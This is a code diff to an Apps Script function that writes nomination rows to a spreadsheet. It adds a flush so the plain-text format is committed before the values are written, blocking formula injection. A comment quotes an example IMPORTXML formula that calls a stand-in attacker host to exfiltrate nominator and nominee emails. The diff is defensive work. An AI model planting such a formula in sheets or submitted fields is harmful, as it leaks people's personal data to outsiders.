@@ -127,11 +127,22 @@ function ensureRoom(sheet, rows, columns) {
  * reading =IMPORTXML("https://evil.example/?"&D2,"//a") becomes a live formula
  * that exfiltrates the panel's sheet -- every nominator and nominee email in
  * it -- the moment a judge opens the tab. Setting the number format to "@"
- * (plain text) first makes Sheets store the characters instead of evaluating
- * them. It must happen BEFORE setValues, not after. */
+ * (plain text) makes Sheets store the characters instead of evaluating them.
+ *
+ * The flush between the two is not decoration, and this was established the
+ * hard way: with setNumberFormat immediately followed by setValues, a live
+ * submission of "=1+1 ..." landed in the sheet as #ERROR! -- Sheets had parsed
+ * it. Both calls are buffered and committed together, so the value is
+ * evaluated before the format it was supposed to be protected by exists. The
+ * flush commits the format first, which is the whole point.
+ *
+ * This cannot be proved by reading this file. The test in
+ * tools/nomination-sheet.test.mjs checks the three calls are in this order and
+ * nothing more; only a real write to a real sheet shows the behaviour. */
 function writeTextRow(sheet, rowNumber, values) {
   var range = sheet.getRange(rowNumber, 1, 1, values.length);
   range.setNumberFormat('@');
+  SpreadsheetApp.flush();
   range.setValues([values.map(String)]);
 }
 
